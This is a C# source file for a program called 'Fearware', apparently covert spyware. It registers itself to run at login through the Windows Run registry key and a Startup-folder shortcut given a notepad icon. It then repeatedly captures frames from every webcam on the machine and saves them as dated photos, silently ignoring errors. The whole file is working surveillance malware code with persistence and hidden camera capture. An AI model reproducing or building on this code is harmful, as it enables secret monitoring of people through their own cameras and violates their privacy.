using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Media;
using System.Windows;
using Windows.Media.Capture;
using Windows.Storage;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using Microsoft.Win32;
using static System.Environment;
using IWshRuntimeLibrary;

namespace Fearware
{
    public class Core
    {
        private FWUtility _fwUtility;
        private string _userName;
        private string _localPath;
        private string _imagesPath;
        private int _photoNumber = 0;
        private int _fInfoIndex = 0;
        private FilterInfoCollection _filterInfoCollection;
        private VideoCaptureDevice _videoCaptureDevice;

        public Core()
        {
            _fwUtility = new FWUtility();
            _userName = Environment.UserName;
            _localPath = Environment.CurrentDirectory;
            _imagesPath = _fwUtility.CreateFolder(_localPath + "\\photos");
            SetStartup();
            StartExecute();
        }

        private void SetStartup()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Fearware", Environment.CurrentDirectory + "\\Fearware.exe");
            }
            catch { }
            try {
                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshShell_Class();
                IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Fearware.lnk") as IWshRuntimeLibrary.IWshShortcut;
                shortcut.Arguments = "";
                shortcut.TargetPath = Environment.CurrentDirectory + "\\Fearware.exe";
                // not sure about what this is for
                shortcut.WindowStyle = 1;
                shortcut.Description = "my shortcut description";
                shortcut.WorkingDirectory = Environment.CurrentDirectory;
                shortcut.IconLocation = "notepad.exe, 0";
                shortcut.Save();
            }
            catch { }
        }


        private void StartExecute()
        {
            while (true)
            {
                _filterInfoCollection = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (FormStart.isActive)
                {
                    for (_fInfoIndex = 0; _fInfoIndex < _filterInfoCollection.Count; _fInfoIndex++)
                    {
                        _videoCaptureDevice = new VideoCaptureDevice(_filterInfoCollection[_fInfoIndex].MonikerString);
                        _videoCaptureDevice.Start();
                        _videoCaptureDevice.NewFrame += CaptureFrame;
                        _videoCaptureDevice.WaitForStop();
                        _photoNumber++;
                    }
                }
                Thread.Sleep(10000);
            }

        }



        private void CaptureFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                _fwUtility.CreateFolder(_imagesPath);
                eventArgs.Frame.Save(_imagesPath + "\\" + _photoNumber + "_" + DateTime.Now.Date.ToShortDateString().Replace("/", "-") + ".jpg", ImageFormat.Jpeg);
                
            }
            catch
            {

            }
            _videoCaptureDevice.SignalToStop();

        }
    }
}
